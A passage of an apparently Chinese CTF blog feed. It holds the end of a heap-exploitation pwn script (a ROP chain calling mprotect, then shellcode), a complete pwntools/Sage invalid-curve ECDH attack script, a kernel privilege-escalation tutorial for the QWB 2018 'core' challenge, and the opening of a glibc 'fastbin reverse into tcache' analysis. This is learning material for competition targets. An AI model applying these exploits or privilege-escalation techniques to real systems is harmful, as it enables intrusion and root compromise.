#控制rip</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mprotect)</span><br><span class="line">payload += p64(fake_io_addr+<span class="number">0x520</span>+<span class="number">0xf0</span>)<span class="comment">#address of shellcode</span></span><br><span class="line">payload += shellcode</span><br><span class="line">edit(<span class="number">1</span>,fake_IO_FILE,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.sendline(str(<span class="number">5</span>))</span><br><span class="line">io.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>还有需要注意的是远程的<code>flag</code>不叫<code>flag</code>,需要用<code>getedents</code>来找一下</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h2><p>没有检验点是否在椭圆曲线上，选取order比较小的点计算$secret \mod order$的值,然后crt组合起来</p><p>和balsn那道题挺像，不过群变成了椭圆曲线上的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># sage </span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">from hashlib import sha256</span><br><span class="line">import string</span><br><span class="line">from pwnlib.util.iters import mbruteforce</span><br><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from functools import reduce</span><br><span class="line">table &#x3D; string.ascii_letters+string.digits</span><br><span class="line">p &#x3D; 0xc483230557557e3d94b7407f3355b8a5b26bda29119babcb8d72b5a19e10e113</span><br><span class="line">a &#x3D; 0xb5ecbb93d4e49fe3c93ad770343ec5ab70131151151fcc830f6c658223c92e1d</span><br><span class="line">B &#x3D; [(100,3733,46559),(102,13457),(103,1499,37057),(105,883,1223,2459),(106,9433),(110,8017 ),(114,1753),(119,163),(120, 479 , 1033,47623 ),(123,4177,17623 ),(124,193 ,2467 ),(125,5147),(130,3499),(133,181,701,36571 ),(135,19211 ,34273), (136,11657),(137,857),(138,167),(140,9629,26701),(141,389),(143, 50363),(145,109 , 181 ,24121 ,223747),(146,3079,243871),(147,3643,129629)]</span><br><span class="line">s &#x3D; 0</span><br><span class="line">def passpow():</span><br><span class="line">    io.recvuntil(b&quot;XXXX+&quot;)</span><br><span class="line">    suffix &#x3D; io.recv(16).decode(&quot;utf8&quot;)</span><br><span class="line">    print(suffix)</span><br><span class="line">    io.recvuntil(b&quot; &#x3D;&#x3D; &quot;)</span><br><span class="line">    cipher &#x3D; io.recvline().strip().decode(&quot;utf8&quot;)</span><br><span class="line">    proof &#x3D; mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() &#x3D;&#x3D;</span><br><span class="line">                        cipher, table, length&#x3D;4, method&#x3D;&#39;fixed&#39;)</span><br><span class="line">    io.recvuntil(&#39;Give me XXXX &gt; &#39;)</span><br><span class="line">    io.sendline(proof) </span><br><span class="line">io &#x3D; remote(&quot;0.0.0.0&quot;,10003)</span><br><span class="line">#io &#x3D; remote(&quot;172.51.227.129&quot;,10002)</span><br><span class="line">#passpow()</span><br><span class="line">for i in B:</span><br><span class="line">s+&#x3D;len(i)</span><br><span class="line">print(s-len(B))</span><br><span class="line">def sendpoint(a,b):</span><br><span class="line">    io.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;X &gt;&quot;)</span><br><span class="line">    io.sendline(a)</span><br><span class="line">    io.recvuntil(&quot;Y &gt;&quot;)</span><br><span class="line">    io.sendline(b)</span><br><span class="line">    io.recvuntil(&quot;result:&quot;)</span><br><span class="line">    return io.recvline()</span><br><span class="line">primes &#x3D; []</span><br><span class="line">K &#x3D; []</span><br><span class="line">s &#x3D; 1</span><br><span class="line">for i in B:</span><br><span class="line">    b &#x3D; i[0]</span><br><span class="line">    E &#x3D; EllipticCurve(GF(p),[a,b])</span><br><span class="line">    order &#x3D; E.order()</span><br><span class="line">    X &#x3D; E.random_point()</span><br><span class="line">    inf &#x3D; X-X</span><br><span class="line">    prime_list &#x3D; i[1:]</span><br><span class="line">    for prime in prime_list:</span><br><span class="line">        while True:</span><br><span class="line">            if(order%prime):</span><br><span class="line">                print(f&quot;ERROR in &#123;i,prime&#125;&quot;)</span><br><span class="line">                print(f&quot;order &#x3D;&#123;order&#125;,prime &#x3D; &#123;prime&#125;,order % prime &#x3D; &#123;order%prime&#125;&quot;)</span><br><span class="line">            G &#x3D; X*int(order&#x2F;&#x2F;prime)</span><br><span class="line">            if(G&#x3D;&#x3D;inf):</span><br><span class="line">                X &#x3D; E.random_point()</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        ans &#x3D; eval(sendpoint(str(G[0]),str(G[1])))</span><br><span class="line">        Q &#x3D; E(ans)</span><br><span class="line">        #print(ans)</span><br><span class="line">        for k in range(prime):</span><br><span class="line">            if(k*G&#x3D;&#x3D;Q):</span><br><span class="line">                primes.append(prime)</span><br><span class="line">                print(f&#39;k &#x3D; &#123;k&#125;&#39;)</span><br><span class="line">                K.append(k)</span><br><span class="line">                break</span><br><span class="line">        print(f&#39;this times is &#123;prime&#125;&#39;)</span><br><span class="line">        #k &#x3D; discrete_log(Q,G,operation &#x3D; &#39;+&#39;) #感觉要慢点,不如爆破</span><br><span class="line"></span><br><span class="line">        #if(k&lt;prime):</span><br><span class="line">        #    print(&quot;yep&quot;)</span><br><span class="line">        #primes.append(prime)</span><br><span class="line">        #K.append(k)</span><br><span class="line">print(primes)</span><br><span class="line">print(K)</span><br><span class="line">ans &#x3D; crt(K,primes)</span><br><span class="line">print(ans)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学不动了，把之前做的记录一下&lt;/p&gt;
&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;p&gt;比赛过程中做出俩&lt;code&gt;pwn&lt;/code&gt;，还有个复现了一下感觉好像也不是很难。剩</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>KernelPwn入门</title>
    <link href="http://phot0n.com/2022/11/17/KernelPwn%E5%85%A5%E9%97%A8/"/>
    <id>http://phot0n.com/2022/11/17/KernelPwn%E5%85%A5%E9%97%A8/</id>
    <published>2022-11-17T05:04:12.000Z</published>
    <updated>2022-11-18T09:20:31.576Z</updated>
    
    <content type="html"><![CDATA[<p>这里记录一下做得第一个kernel pwn题，非常经典的强网杯2018的core，网上很多相关的wp。由于笔者的知识比较匮乏，所以有些可能会写的比较啰嗦(应该比较适合像我一样的新生)</p><p>最近在学kernel相关知识(在啃<code>a guide to kernel exploitation</code>,读英文有点难受)，还打算学一下沙盒原理之类的(比如CSAW那个shellcode题就打算稍微总结一下)，不过时间有点紧，自己也比较懒…能学一点是一点吧</p><h2 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018 core"></a>强网杯2018 core</h2><p>这是一道kernel ROP题,和我们在用户态下的ROP很像.kernel pwn的目的是提权,即让我们从一个普通用户晋升为一个<code>root</code>.而用户态和kernel下的ROP主要的区别是我们在用户态下执行的是<code>system(&quot;/bin/sh&quot;)</code>,而在内核态下执行的是<code>commit_creds(prepare_kernel_cred(NULL))</code> .我们执行这个命令来改变当前进程的<code>cred</code>结构体.这个结构体是内核中用以控制一个进程的权限的结构体.</p><p>而执行的这两个函数分别为<code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>以及<code>int commit_creds(struct cred *new)</code> </p><p>前者的作用是复制一个进程的<code>cred</code>结构体,然后返回一个新的<code>cred</code>结构体,而后者的作用是将一个新的<code>cred</code>结构体置于一个新进程.</p><p>详细的函数定义我们可以查阅linux的源码,具体路径在kernel/cred.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是我在5.11找的的源码,但是似乎我找的有部分源码长这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure><p>好像主要区别是前者只能复制当前进程的<code>cred</code>?但是后者能复制<code>init_cred</code>也就是<code>init</code>进程的<code>cred</code>,可以直接获取一个<code>root</code>权限的<code>cred</code>结构体</p><p>(这里不是很懂,如果以后搞明白了再进行修改.貌似是高版本做了点修改使得利用变困难了)</p><p>总的来说,我们的目标是调用<code>commit_creds(prepare_kernel_cred(NULL))</code> </p><p>但是我们还有其他需要注意的地方.当exp进入到内核态完成提权的时候,最终还是要回到用户态执行<code>system(&quot;/bin/sh&quot;)</code>命令然后开启一个具有<code>root</code>权限的<code>shell</code>.所以进入内核态之前需要进行<strong>状态保存</strong>,也就是模拟一下用户态进入内核态的准备,包括保存各种寄存器之类的</p><p>在返回用户态的时候,我们需要<code>swapgs</code>指令来恢复用户态的GS寄存器,还需要<code>sysretq</code>或者<code>iretq</code>来恢复到用户空间.</p><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>具体的打包解包问题就不在这整理了,很多blog上面都有介绍,这里主要记录一下原理和利用相关</p><p>通过查看<code>start.sh</code>,我们可以看到开启的保护(这里开启了<code>kaslr</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>这里需要注意最好把内存改大一点,不然可能运行的时候会报错(我改成了512M)</p><p>把文件系统解包之后可以看到<code>init</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mount -t proc proc &#x2F;proc</span><br><span class="line">mount -t sysfs sysfs &#x2F;sys</span><br><span class="line">mount -t devtmpfs none &#x2F;dev</span><br><span class="line">&#x2F;sbin&#x2F;mdev -s</span><br><span class="line">mkdir -p &#x2F;dev&#x2F;pts</span><br><span class="line">mount -vt devpts -o gid&#x3D;4,mode&#x3D;620 none &#x2F;dev&#x2F;pts</span><br><span class="line">chmod 666 &#x2F;dev&#x2F;ptmx</span><br><span class="line">cat &#x2F;proc&#x2F;kallsyms &gt; &#x2F;tmp&#x2F;kallsyms</span><br><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict</span><br><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod &#x2F;core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh</span><br><span class="line">echo &#39;sh end!\n&#39;</span><br><span class="line">umount &#x2F;proc</span><br><span class="line">umount &#x2F;sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p><code>/proc/sys/kernel/kptr_restrict</code>决定了我们能否通过<code>/proc/kallsyms</code>来查看函数地址,<code>init</code>将其设置为1,所以无法查看,但是在设置之前被复制了一份到<code>/tmp/kallsyms</code>中</p><p><code>/proc/sys/kernel/dmesg_restrict</code>决定了我们能否访问内核打印的消息,设置为1时将无法访问</p><p>我们先分析一下这个<code>core.ko</code></p><p><img src="https://s2.loli.net/2022/11/18/3Ox4JKLNVMpBT6H.png" alt=""></p><p>开启了<code>canary</code></p><p><code>insmod</code>将<code>core.ko</code>模块载入,这就是有漏洞的模块,我们将其拖入IDA进行分析</p><p><img src="https://s2.loli.net/2022/11/18/9UNj8znsOKV54g2.png" alt=""></p><p><code>proc_create</code>创建了一个<code>proc</code>虚拟文件,引用出通过读写这个文件就可以实现与内核的交互</p><p>而<code>core_fops</code>是一个<code>file_operations</code>结构体,其内容大多是函数指针.那么我们可以通过修改其中的函数指针来达到重写函数的目的.</p><p>通过查看结构体可以发现这里其实重写了三个,分别是<code>core_write</code>,<code>core_ioctl</code>以及<code>core_release</code></p><p><code>core_toctl</code>具体由三个功能,分别是<code>core_read</code>,设置<code>off</code>,以及<code>core_copy_func</code></p><p><img src="https://s2.loli.net/2022/11/18/34aMmqAw8BExFb2.png" alt=""></p><p>我们先看看这个<code>core_read</code></p><p><img src="https://s2.loli.net/2022/11/18/Fln7UvmfNQXK4dO.png" alt=""></p><p>这里将内核栈上的64个字节内容复制到了用户区(<code>copy_to_user</code>),由于我们可以设置<code>off</code>,所以我们可以把内核栈的<code>canary</code>给复制到用户态的栈上然后泄露出来</p><p>再看看这个<code>core_copy_func</code></p><p><img src="https://s2.loli.net/2022/11/18/df4uUOhkxINVJC6.png" alt=""></p><p>这里我们可以将bss段(也就是这个<code>name</code>)上的内容复制<code>a1</code>个字节到内核栈上,注意到这里虽然检测设置了<code>a1&lt;=63</code>,但是最后调用的时候是将<code>__int64</code>类型的<code>a1</code>强制转换成了<code>unsigned _int16</code>,所以如果我们设置<code>a1</code>为负数的话强制转化之后它会变成一个很大的数,所以存在栈溢出的漏洞</p><p>同时,<code>core_write</code>函数可以实现对这个bss段内容的设置</p><p><img src="https://s2.loli.net/2022/11/18/6rIv5JNGgdMwZnC.png" alt=""></p><p>所以我们的思路就很明显了</p><ul><li>通过<code>core_read</code>泄露内核栈上的<code>canary</code></li><li>通过<code>core_write</code>对<code>bss</code>段填充好ROP链</li><li>执行<code>core_copy_func</code>函数,进行栈溢出执行ROP链</li><li>返回用户态,新起一个<code>root shell</code></li></ul><p>还有就是关于函数地址的问题,这个类似用户态下的<code>libc</code>基址的泄露,由于符号表被复制了一份到<code>/tmp/kallsyms</code>中,所以我们可以从中获取地址然后计算基址从而得到运行时的地址</p><p>还有就是关于<code>gdb</code>与<code>qemu</code>调试的相关内容.首先是如何用<code>gdb</code>进行调试,当运行脚本<code>/start.sh</code>的时候已经通过<code>-s</code>开启了调试端口,默认的为<code>1234</code>,所以我们另起一个终端,运行<code>gdb vmlinux</code>,然后直接通过<code>target remote localhost:1234</code>进行连接</p><p><img src="https://s2.loli.net/2022/11/18/lRJYAwmPQogDn5N.png" alt=""></p><p>还有就是vmlinux里面有<code>kernel</code>的符号表,但是没有驱动<code>core.ko</code>的符号表,这个需要我们自己添加,主要的命令是<code>add-symbol-file</code>,就把<code>core.ko</code>载入即可.再此之前我们需要获取<code>core.ko</code>的<code>text</code>段地址,通过<code>/sys/modules/core/section/.text</code>来查看,但是查看它需要root权限,所以我们修改一下<code>init</code>重新打包就好了</p><p><img src="https://s2.loli.net/2022/11/18/YmGECX3eQuUlb4S.png" alt=""></p><p>然后就就可以开始调试了,调试的区别好像和用户态下的区别不是很大,多动手自己尝试几遍就行了(<code>make your hand dirty XD</code>)</p><p>exp就不贴了，第一次接触都是调试的别的大佬的exp(x)，也就运行了一下然后下断点单步调试看看思路之类的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里记录一下做得第一个kernel pwn题，非常经典的强网杯2018的core，网上很多相关的wp。由于笔者的知识比较匮乏，所以有些可能会写的比较啰嗦(应该比较适合像我一样的新生)&lt;/p&gt;
&lt;p&gt;最近在学kernel相关知识(在啃&lt;code&gt;a guide to kern</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fastbin reverse into tcache</title>
    <link href="http://phot0n.com/2022/11/14/fastbin-reverse-into-tcache/"/>
    <id>http://phot0n.com/2022/11/14/fastbin-reverse-into-tcache/</id>
    <published>2022-11-14T06:36:55.000Z</published>
    <updated>2022-11-14T09:53:02.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>上次祥云杯中遇到了<code>fastbin reverse into tcache</code>的利用手法，这里简单分析一下它的原理。需要注意的是，在glibc2.27以下和以上的利用方式有点区别。高版本的<code>glibc</code>在利用的时候必须保证相应大小的<code>tcache bin</code>为空(也就是<code>count</code>为0)，而低版本(<code>glibc2.27</code>及以下，当然需要有<code>tcachebin</code>)只要保证相应<code>entry</code>指针为<code>NULL</code>即可，不用保证<code>count</code>为0</p><p>先首先说一下利用条件以及达到效果。</p><ul><li>利用条件:存在UAF,可以修改<code>fd</code></li><li>达到效果:在任意地址写上一个堆地址,以及申请相应<code>chunk</code>，进行任意地址写</li></ul><p>主要的源码如下所示，我们先看<code>glibc2.27</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">   